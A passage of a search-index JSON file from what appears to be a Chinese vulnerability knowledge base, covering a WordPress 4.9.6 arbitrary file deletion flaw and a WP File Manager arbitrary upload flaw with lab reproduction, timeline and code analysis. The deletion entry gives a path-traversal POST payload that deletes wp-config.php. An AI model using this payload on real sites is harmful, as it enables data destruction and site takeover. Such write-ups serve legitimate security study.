\u4e0d\u5305\u542b\u4efb\u4f55\u53ef\u4ee5\u8fdb\u884c\u8def\u5f84\u904d\u5386\u7684\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u4e0d\u80fd\u5220\u9664\u4efb\u4f55\u5b89\u5168\u76f8\u5173\u6587\u4ef6\u3002 \u63d0\u4f9b\u7684\u4fee\u590d\u7a0b\u5e8f\u6700\u7ec8\u5e94\u89c6\u4e3a\u4e34\u65f6\u4fee\u590d\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u3002\u6211\u4eec\u65e0\u6cd5\u76d1\u7763WordPress\u63d2\u4ef6\u7684\u6240\u6709\u53ef\u80fd\u7684\u5411\u540e\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u5e76\u5efa\u8bae\u60a8\u8c28\u614e\u5bf9WordPress\u6587\u4ef6\u8fdb\u884c\u4efb\u4f55\u4fee\u6539\u3002 \u62ab\u9732\u65f6\u95f4\uff1a","title":"\u4e34\u65f6\u4fee\u8865\u7a0b\u5e8f"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_2","text":"\u65e5\u671f \u4ec0\u4e48 2017\u5e7411\u670820\u65e5 \u5728Hackerone\u4e0a\u5411WordPress\u5b89\u5168\u56e2\u961f\u62a5\u544a\u4e86\u6f0f\u6d1e\u3002 2017\u5e7411\u670822\u65e5 \u8be5\u6f0f\u6d1e\u7531\u5b89\u5168\u56e2\u961f\u8fdb\u884c\u5206\u7c7b\u548c\u9a8c\u8bc1\u3002 2017\u5e7412\u670812\u65e5 \u8981\u6c42\u8fdb\u6b65\u3002 2017\u5e7412\u670818\u65e5 Wordpress\u6b63\u5728\u5f00\u53d1\u4e00\u4e2a\u8865\u4e01\u3002\u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u67089\u65e5 \u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u670820\u65e5 \u7531\u4e8e\u95ee\u9898\u7684\u4e25\u91cd\u6027\u548c\u7f3a\u4e4f\u6c9f\u901a\u800c\u88ab\u8981\u6c42\u5bf9Hackerone\u8fdb\u884c\u8c03\u89e3\u3002 2018\u5e741\u670824\u65e5 WordPress\u5b89\u5168\u56e2\u961f\u4f30\u8ba1\u4fee\u590d\u65f6\u95f4\u4e3a6\u4e2a\u6708\u3002 2018\u5e745\u670824\u65e5 \u88ab\u95ee\u53ca\u6709\u5173\u8be5\u95ee\u9898\u7684\u8fdb\u5c55\u548c/\u6216\u8ba1\u5212\uff0c\u5e76\u63d0\u9192\u6211\u4eec\u5c06\u5c3d\u5feb\u53d1\u5e03\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e745\u670824\u65e5 \u5c06twitter DM\u53d1\u9001\u7ed9\u5b89\u5168\u56e2\u961f\u7684\u6210\u5458\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u4e0d\u4f1a\u5ffd\u7565Hackerone\u4e0a\u7684\u6d88\u606f\u3002 2018\u5e746\u670826\u65e5 \u8be5\u95ee\u9898\u5728\u62a5\u544a\u540e\u8d85\u8fc77\u4e2a\u6708\u672a\u5f97\u5230\u4fee\u8865\u3002 \u8be6\u7ec6\u5206\u6790\u53ef\u89c1\uff1aWARNING: WordPress File Delete to Code Execution - https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/","title":"\u65f6\u95f4\u7ebf"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#0x03","text":"\u6761\u4ef6\uff1a\u9700\u8981\u767b\u9646\u540e\u53f0\uff0c\u6709\u70b9\u9e21\u52a9 \u540e\u53f0\u5730\u5740\uff1a http://10.10.10.103/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.103%2Fwp-admin%2F&reauth=1 \u8fdb\u5165\u540e\u53f0\u540e\uff0c\u70b9\u51fbMedia\uff08\u5a92\u4f53\uff09\uff0c\u5728\u70b9\u51fbAdd New (\u6dfb\u52a0) \u8fdb\u5165\u5230\u4e0a\u4f20\u6587\u4ef6\u4f4d\u7f6e \u4e0a\u4f20\u597d\u56fe\u7247\u4ee5\u540e\uff0c\u70b9\u51fb\u53f3\u8fb9Edit\uff08\u7f16\u8f91\u6309\u94ae\uff09 \u8df3\u8f6c\u5230 http://10.10.10.103/wp-admin/post.php?post=21&action=edit \u6b64\u65f6\u6253\u5f00F12,\u641c\u7d22post.php,\u627e\u5230_wpnonce\u7684\u503c\u4e3ad8efee3064 \u7136\u540e\u53d1\u9001post\u6570\u636e\u5305 (\u9700\u8981\u5e26\u5165cookie\u503c) POST /wp-admin/post.php?post=21&action=edit HTTP/1.1 payload: action=editattachment&_wpnonce=d8efee3064&thumb=../../../../wp-config.php \u53d1\u9001\u6210\u529f\u4f1a\u8fd4\u56de302\u72b6\u6001 \u6b64\u65f6\u5728\u70b9\u51fb\u5220\u9664\u6309\u94ae Delete Permanently http://10.10.10.103/wp-admin/post.php?post=21&action=delete&_wpnonce=05621e9c6b \u6293\u5305\u67e5\u770b\uff0c\u4e5f\u662f\u8fd4\u56de302\u5305 \u518d\u53bb\u7f51\u7ad9\u6839\u76ee\u5f55\u67e5\u770bwp-config.php \u53d1\u73b0wp-config.php (\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u88ab\u6210\u529f\u5220\u9664\u4e86) \u518d\u6b21\u8bbf\u95ee\u9996\u9875\uff0c \u4f1a\u53d1\u73b0\u63d0\u793a\u4f60\u91cd\u65b0\u5b89\u88c5wordpress","title":"0x03 \u6f0f\u6d1e\u5229\u7528"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#-","text":"\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u5220\u9664WordPress\u5b89\u88c5\u7684\u4efb\u4f55\u6587\u4ef6\uff08+ PHP\u8fdb\u7a0b\u7528\u6237\u5177\u6709\u5220\u9664\u6743\u9650\u7684\u670d\u52a1\u5668\u4e0a\u7684\u4efb\u4f55\u5176\u4ed6\u6587\u4ef6\uff09\u3002\u9664\u4e86\u64e6\u9664\u6574\u4e2aWordPress\u5b89\u88c5\u7684\u53ef\u80fd\u6027\uff0c\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u5f53\u524d\u5907\u4efd\u53ef\u80fd\u4f1a\u4ea7\u751f\u707e\u96be\u6027\u540e\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u80fd\u529b\u6765\u89c4\u907f\u4e00\u4e9b\u5b89\u5168\u63aa\u65bd\u5e76\u5728Web\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u66f4\u786e\u5207\u5730\u8bf4\uff0c\u53ef\u4ee5\u5220\u9664\u4ee5\u4e0b\u6587\u4ef6\uff1a .htaccess\uff1a\u901a\u5e38\uff0c\u5220\u9664\u6b64\u6587\u4ef6\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u5b89\u5168\u540e\u679c\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c*.htaccess*\u6587\u4ef6\u5305\u542b\u4e0e\u5b89\u5168\u6027\u76f8\u5173\u7684\u7ea6\u675f\uff08\u4f8b\u5982\uff0c\u5bf9\u67d0\u4e9b\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u7ea6\u675f\uff09\u3002\u5220\u9664\u6b64\u6587\u4ef6\u5c06\u505c\u7528\u8fd9\u4e9b\u5b89\u5168\u7ea6\u675f\u3002 index.php\u6587\u4ef6\uff1a\u901a\u5e38\u5c06\u7a7a\u7684*index.php*\u6587\u4ef6\u653e\u5165\u76ee\u5f55\u4e2d\uff0c\u4ee5\u9632\u6b62Web\u670d\u52a1\u5668\u65e0\u6cd5\u6267\u884c\u6b64\u64cd\u4f5c\u7684\u76ee\u5f55\u5217\u8868\u3002\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5411\u653b\u51fb\u8005\u6388\u4e88\u53d7\u6b64\u5ea6\u91cf\u4fdd\u62a4\u7684\u76ee\u5f55\u4e2d\u6240\u6709\u6587\u4ef6\u7684\u5217\u8868\u3002 wp-config.php\uff1a\u5220\u9664WordPress\u5b89\u88c5\u7684\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5728\u4e0b\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\u89e6\u53d1WordPress\u5b89\u88c5\u8fc7\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a*wp-config.php*\u5305\u542b\u6570\u636e\u5e93\u51ed\u636e\uff0c\u5e76\u4e14\u6ca1\u6709\u5b83\u7684\u5b58\u5728\uff0cWordPress\u5c31\u50cf\u5c1a\u672a\u5b89\u88c5\u4e00\u6837\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6b64\u6587\u4ef6\uff0c\u4f7f\u7528\u4ed6\u4e3a\u7ba1\u7406\u5458\u5e10\u6237\u9009\u62e9\u7684\u51ed\u636e\u8fdb\u884c\u5b89\u88c5\u8fc7\u7a0b\uff0c\u6700\u540e\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002","title":"\u5f71\u54cd - \u653b\u51fb\u8005\u53ef\u4ee5\u505a\u4e9b\u4ec0\u4e48"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#0x04","text":"https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ https://xz.aliyun.com/t/2413","title":"0x04 \u53c2\u8003\u8d44\u6599"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/","text":"\u7b80\u4ecb \u00b6 WordPress\u63d2\u4ef6WPFileManager\u4e2d\u5b58\u5728\u4e00\u4e2a\u4e25\u91cd\u76840day\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5b89\u88c5\u4e86\u6b64\u63d2\u4ef6\u7684\u4efb\u4f55WordPress\u7f51\u7ad9\u4e0a\u4efb\u610f\u4e0a\u4f20\u6587\u4ef6\u5e76\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002 \u5f71\u54cd\u7248\u672c \u00b6 File Manager 6.0-6.8 \u73af\u5883\u642d\u5efa \u00b6 Wordpress\u4e0b\u8f7d\u5730\u5740 https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz \u63d2\u4ef6\u4e0b\u8f7d\u5730\u5740 http://plugins.svn.wordpress.org/wp-file-manager/tags/6.0/ \u767b\u5f55\u540e\u53f0\u628a\u63d2\u4ef6\u538b\u7f29\u5305\u4e0a\u4f20\u63d2\u4ef6\u5e76\u542f\u52a8 \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95eehttp://192.168.56.1/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\u9875\u9762\u53ef\u4ee5\u53d1\u73b0errUnknownCmd \u7591\u4f3c\u6f0f\u6d1e Poc\u5730\u5740\uff1a https://github.com/xDro1d/wp-file-manager \u53ef\u4ee5\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c \u6f0f\u6d1e\u5206\u6790 \u00b6 \u76f4\u63a5\u4eceelFinderConnector\u6784\u9020\u65b9\u6cd5\u540e\u7684run\u5f00\u59cb \u7136\u540e\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\php\\elFinderConnector.class.php\u6587\u672c\u4e2d \u521d\u59cb\u5316 \u7136\u540erun \u9996\u5148\u5224\u65ad\u662f\u5426\u662fPOST\u65b9\u6cd5\u4f20\u5165\u6570\u636e\uff0c\u63a5\u7740\u5408\u5e76\u6570\u7ec4\u81f3$src \\(maxInuptVars = null\uff0c\u800c\\) src\u662f\u5b58\u5728\u7684 \u6b64\u65f6$_REQUEST\u4e2d\uff0ccmd\u4e3aupload\uff0ctarget\u4e3al1_Lw== \u6ca1\u6709targets\u53c2\u6570,\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u4e0d\u6267\u884c \u7b2c\u4e8c\u4e2aif\u8bed\u53e5\u5224\u65adjson_encode\u65b9\u6cd5\u662f\u5426\u53ef\u7528\uff0c\u540e\u9762\u770bflFinder->loaded\u65b9\u6cd5\uff0c\u8fd9\u91cc\u8fd4\u56detrue\uff0c\u8df3\u8fc7 Cmd\u5b58\u5728\u503c\uff0c\u8df3\u8fc7 \u6b64\u5904\u7684$cmd\u4e3aupload \u6765\u5230foreach\u8bed\u53e5 commandArgsList\u65b9\u6cd5\u8ddf\u8fdb \u6574\u7406\u5f97 'upload' => array('target' => true, 'FILES' => true, 'mimes' => false, 'html' => false, 'upload' => false, 'name' => false, 'upload_path' => false, 'chunk' => false, 'cid' => false, 'node' => false, 'renames' => false, 'hashes' => false, 'suffix' => false, 'mtime' => false, 'overwrite' => false, 'contentSaveId' => false \\(list\u7b2c\u4e00\u952e\u503c\u4e0d\u662fFILES\uff0c\u6240\u4ee5\u8df3\u8fc7\u7b2c\u4e00\u4e2aif\u8bed\u53e5\uff0c\u800c\u7b2c\u4e00\u4e2atarget\u53c8\u5b58\u5728\u4e8e\\) src\u6570\u7ec4\u4e2d \u5c06target\u7684\u503c\u7ed9\u4e86$arg\uff0c\u518d\u7528trim\u51fd\u6570\u6e05\u7a7a\u767d\u5b57\u7b26 $args\u4e2ddebug\u662f\u5b58\u5728\u7684\uff0c\u6240\u4ee5debug\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3afalse \u63a5\u7740\u5c31\u662felFinderConnector\u7684input_filter\u65b9\u6cd5 \u56e0\u4e3a\u8fd9\u91cc\u7684php\u7248\u672c\u5927\u4e8e5.4\u6240\u4ee5 \\(magic_quotes_gpc\u7684\u503c\u4e3afalse\uff0c\\) args\u662f\u6570\u7ec4\uff0c\u7136\u540e\u90fd\u8fdb\u884c\u8fc7\u6ee4\u4e00\u904d \u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570 \u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570 \u5728exec\u51fd\u6570\u4e2d\u5224\u65ad\u5b8csession\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u4e0a\u4f20\u64cd\u4f5c\u4e4b\u540e\u7ee7\u7eed\u5224\u65ad \u5c06l1_Lw== \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9volume\u51fd\u6570 \u6b64\u65f6volumes\u4e2d\u6709\u4e24\u4e2a\u952e\uff0c\u5230\u6b64\u5904\u53ef\u4ee5\u53d1\u73b0POC\u4e2d\u4e0a\u4f20\u6587\u4ef6\u7684target\u5143\u7d20\u7684\u503c\u53ea\u80fd\u4ee5l1\u6216\u8005t1\u5f00\u5934 \u8fd9\u91cc\u4f20\u5165\u7684$hash\u4e3al1_Lw== $result\u4e3a\u7a7a $args['sessionCloseEarlier']\u88ab\u8bbe\u7f6e\u4e3atrue\u7b49\u7b49 \u8ddf\u8fdb$cmd\u8fdb\u5165\u5230upload\u65b9\u6cd5 \u63a5\u7740\u83b7\u53d6\u5230\u6587\u4ef6\u7684\u4e34\u65f6\u6587\u4ef6\u540d\uff0c \\(paths\u83b7\u53d6\u5230\u6587\u4ef6\u8def\u5f84\u4e3a\\) target\u7684\u503c \u63a5\u7740 \\(files\uff0c\\) header\u7b49\u4e00\u7cfb\u5217\u53d8\u91cf\u5bf9\u6587\u4ef6\u4e0a\u4f20\u7684\u8bbe\u7f6e\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8005\u5f97\u5230\u4e0a\u4f20\u6587\u4ef6\u7684\u5177\u4f53\u4fe1\u606f post\u63d0\u4ea4cmd\u7684\u503c\uff0c\u8c03\u7528upload\u65b9\u6cd5\uff0cupload\u65b9\u6cd5\u4ece\u4e0a\u4f20\u6587\u4ef6\u4e2d\u63d0\u53d6\u4fe1\u606f $files\u7684error\u4e3a0\uff0c\u4f7f\u7528\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u76f4\u63a5\u5ffd\u7565 \u63a5\u7740\u770bchangeDst\u88ab\u8bbe\u7f6e\u4e3afalse\uff0c\u56e0\u4e3a\u7b2c\u4e00\u4e2aif\u5faa\u73af\u4e2d\u7684\u503c\u90fd\u5b58\u5728\uff0c\u6240\u4ee5\u5c06$changeDst\u8bbe\u7f6e\u4e3atrue\uff0c\u4e4b\u540e\u8fdb\u5165foreach\u5faa\u73af ' \u6b64\u65f6\u7684 \\(_target\u5df2\u7ecf\u6709\\) target\u7684\u503c\u4e86 \u7ee7\u7eed\u8ddf\u8fdb \u6765\u5230commandDisabled\u51fd\u6570\u5224\u65ad\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u529f\u80fd \u6709\u4e0a\u4f20\u529f\u80fd\uff0c\u7ee7\u7eed\u8c03\u7528dir\u65b9\u6cd5\uff0c\u5c06$hash(target)\u7684\u503c\u4f20\u5165\uff0c\u518d\u8ddf\u8fdbfile\u65b9\u6cd5 file\u51fd\u6570\u4e2d\u6709\u4e00\u4e2adecode\u65b9\u6cd5\uff0c\u8ddf\u8fdb \u8fd9\u91cc\u628a\u6211\u4eec\u7684l1_Lw==\u8fdb\u884c\u4e86\u89e3\u7801\uff0cdecode\u51fd\u6570\u9996\u5148\u5224\u65ad$hash\u662f\u4ee5l1_\u5f00\u5934\uff0c\u8fd8\u662f\u4ee5t1_\u5f00\u5934\uff0c\u63a5\u7740\u5bf9l1_\u4e4b\u540e\u7684\u90e8\u5206\u8fdb\u884cbase64\u89e3\u7801 \u7d27\u63a5\u7740\u8fd4\u56de\u6211\u4eec\u7684file\u65b9\u6cd5 file\u65b9\u6cd5\u53c8\u8fd4\u56de\u7ed9dir\u65b9\u6cd5 \u8ddf\u8fdb\u5230mimetype\u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u7684\u4e0a\u4f20\u7c7b\u578b","title":"\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_1","text":"WordPress\u63d2\u4ef6WPFileManager\u4e2d\u5b58\u5728\u4e00\u4e2a\u4e25\u91cd\u76840day\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5b89\u88c5\u4e86\u6b64\u63d2\u4ef6\u7684\u4efb\u4f55WordPress\u7f51\u7ad9\u4e0a\u4efb\u610f\u4e0a\u4f20\u6587\u4ef6\u5e76\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002","title":"\u7b80\u4ecb"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","text":"File Manager 6.0-6.8","title":"\u5f71\u54cd\u7248\u672c"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_3","text":"Wordpress\u4e0b\u8f7d\u5730\u5740 https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz \u63d2\u4ef6\u4e0b\u8f7d\u5730\u5740 http://plugins.svn.wordpress.org/wp-file-manager/tags/6.0/ \u767b\u5f55\u540e\u53f0\u628a\u63d2\u4ef6\u538b\u7f29\u5305\u4e0a\u4f20\u63d2\u4ef6\u5e76\u542f\u52a8","title":"\u73af\u5883\u642d\u5efa"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_4","text":"\u8bbf\u95eehttp://192.168.56.1/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\u9875\u9762\u53ef\u4ee5\u53d1\u73b0errUnknownCmd \u7591\u4f3c\u6f0f\u6d1e Poc\u5730\u5740\uff1a https://github.com/xDro1d/wp-file-manager \u53ef\u4ee5\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_5","text":"\u76f4\u63a5\u4eceelFinderConnector\u6784\u9020\u65b9\u6cd5\u540e\u7684run\u5f00\u59cb \u7136\u540e\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\php\\elFinderConnector.class.php\u6587\u672c\u4e2d \u521d\u59cb\u5316 \u7136\u540erun \u9996\u5148\u5224\u65ad\u662f\u5426\u662fPOST\u65b9\u6cd5\u4f20\u5165\u6570\u636e\uff0c\u63a5\u7740\u5408\u5e76\u6570\u7ec4\u81f3$src \\(maxInuptVars = null\uff0c\u800c\\) src\u662f\u5b58\u5728\u7684 \u6b64\u65f6$_REQUEST\u4e2d\uff0ccmd\u4e3aupload\uff0ctarget\u4e3al1_Lw== \u6ca1\u6709targets\u53c2\u6570,\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u4e0d\u6267\u884c \u7b2c\u4e8c\u4e2aif\u8bed\u53e5\u5224\u65adjson_encode\u65b9\u6cd5\u662f\u5426\u53ef\u7528\uff0c\u540e\u9762\u770bflFinder->loaded\u65b9\u6cd5\uff0c\u8fd9\u91cc\u8fd4\u56detrue\uff0c\u8df3\u8fc7 Cmd\u5b58\u5728\u503c\uff0c\u8df3\u8fc7 \u6b64\u5904\u7684$cmd\u4e3aupload \u6765\u5230foreach\u8bed\u53e5 commandArgsList\u65b9\u6cd5\u8ddf\u8fdb \u6574\u7406\u5f97 'upload' => array('target' => true, 'FILES' => true, 'mimes' => false, 'html' => false, 'upload' => false, 'name' => false, 'upload_path' => false, 'chunk' => false, 'cid' => false, 'node' => false, 'renames' => false, 'hashes' => false, 'suffix' => false, 'mtime' => false, 'overwrite' => false, 'contentSaveId' => false \\(list\u7b2c\u4e00\u952e\u503c\u4e0d\u662fFILES\uff0c\u6240\u4ee5\u8df3\u8fc7\u7b2c\u4e00\u4e2aif\u8bed\u53e5\uff0c\u800c\u7b2c\u4e00\u4e2atarget\u53c8\u5b58\u5728\u4e8e\\) src\u6570\u7ec4\u4e2d \u5c06target\u7684\u503c\u7ed9\u4e86$arg\uff0c\u518d\u7528trim\u51fd\u6570\u6e05\u7a7a\u767d\u5b57\u7b26 $args\u4e2ddebug\u662f\u5b58\u5728\u7684\uff0c\u6240\u4ee5debug\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3afalse \u63a5\u7740\u5c31\u662felFinderConnector\u7684input_filter\u65b9\u6cd5 \u56e0\u4e3a\u8fd9\u91cc\u7684php\u7248\u672c\u5927\u4e8e5.4\u6240\u4ee5 \\(magic_quotes_gpc\u7684\u503c\u4e3afalse\uff0c\\) args\u662f\u6570\u7ec4\uff0c\u7136\u540e\u90fd\u8fdb\u884c\u8fc7\u6ee4\u4e00\u904d \u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570 \u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570 \u5728exec\u51fd\u6570\u4e2d\u5224\u65ad\u5b8csession\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u4e0a\u4f20\u64cd\u4f5c\u4e4b\u540e\u7ee7\u7eed\u5224\u65ad \u5c06l1_Lw== \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9volume\u51fd\u6570 \u6b64\u65f6volumes\u4e2d\u6709\u4e24\u4e2a\u952e\uff0c\u5230\u6b64\u5904\u53ef\u4ee5\u53d1\u73b0POC\u4e2d\u4e0a\u4f20\u6587\u4ef6\u7684target\u5143\u7d20\u7684\u503c\u53ea\u80fd\u4ee5l1\u6216\u8005t1\u5f00\u5934 \u8fd9\u91cc\u4f20\u5165\u7684$hash\u4e3al1_Lw== $result\u4e3a\u7a7a $args['sessionCloseEarlier']\u88ab\u8bbe\u7f6e\u4e3atrue\u7b49\u7b49 \u8ddf\u8fdb$cmd\u8fdb\u5165\u5230upload\u65b9\u6cd5 \u63a5\u7740\u83b7\u53d6\u5230\u6587\u4ef6\u7684\u4e34\u65f6\u6587\u4ef6\u540d\uff0c \\(paths\u83b7\u53d6\u5230\u6587\u4ef6\u8def\u5f84\u4e3a\\) target\u7684\u503c \u63a5\u7740 \\(files\uff0c\\) header\u7b49\u4e00\u7cfb\u5217\u53d8\u91cf\u5bf9\u6587\u4ef6\u4e0a\u4f20\u7684\u8bbe\u7f6e\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8005\u5f97\u5230\u4e0a\u4f20\u6587\u4ef6\u7684\u5177\u4f53\u4fe1\u606f post\u63d0\u4ea4cmd\u7684\u503c\uff0c\u8c03\u7528upload\u65b9\u6cd5\uff0cupload\u65b9\u6cd5\u4ece\u4e0a\u4f20\u6587\u4ef6\u4e2d\u63d0\u53d6\u4fe1\u606f $files\u7684error\u4e3a0\uff0c\u4f7f\u7528\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u76f4\u63a5\u5ffd\u7565 \u63a5\u7740\u770bchangeDst\u88ab\u8bbe\u7f6e\u4e3afalse\uff0c\u56e0\u4e3a\u7b2c\u4e00\u4e2aif\u5faa\u73af\u4e2d\u7684\u503c\u90fd\u5b58\u5728\uff0c\u6240\u4ee5\u5c06$changeDst\u8bbe\u7f6e\u4e3atrue\uff0c\u4e4b\u540e\u8fdb\u5165foreach\u5faa\u73af ' \u6b64\u65f6\u7684 \\(_target\u5df2\u7ecf\u6709\\) target\u7684\u503c\u4e86 \u7ee7\u7eed\u8ddf\u8fdb \u6765\u5230commandDisabled\u51fd\u6570\u5224\u65ad\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u529f\u80fd \u6709\u4e0a\u4f20\u529f\u80fd\uff0c\u7ee7\u7eed\u8c03\u7528dir\u65b9\u6cd5\uff0c\u5c06$hash(target)\u7684\u503c\u4f20\u5165\uff0c\u518d\u8ddf\u8fdbfile\u65b9\u6cd5 file\u51fd\u6570\u4e2d\u6709\u4e00\u4e2adecode\u65b9\u6cd5\uff0c\u8ddf\u8fdb \u8fd9\u91cc\u628a\u6211\u4eec\u7684l1_Lw==\u8fdb\u884c\u4e86\u89e3\u7801\uff0cdecode\u51fd\u6570\u9996\u5148\u5224\u65ad$hash\u662f\u4ee5l1_\u5f00\u5934\uff0c\u8fd8\u662f\u4ee5t1_\u5f00\u5934\uff0c\u63a5\u7740\u5bf9l1_\u4e4b\u540e\u7684\u90e8\u5206\u8fdb\u884cbase64\u89e3\u7801 \u7d27\u63a5\u7740\u8fd4\u56de\u6211\u4eec\u7684file\u65b9\u6cd5 file\u65b9\u6cd5\u53c8\u8fd4\u56de\u7ed9dir\u65b9\u6cd5 \u8ddf\u8fdb\u5230mimetype\u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u7684\u4e0a\u4f20\u7c7b\u578b","title":"\u6f0f\u6d1e\u5206\u6790"},{"location":"01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/wordpress%E8%AF%84%E8%AE%BA%E6%8F%92%E4%BB%B6wpDiscuz%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","text":"WordPress\u8bc4\u8bba\u63d2\u4ef6wpDiscuz\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 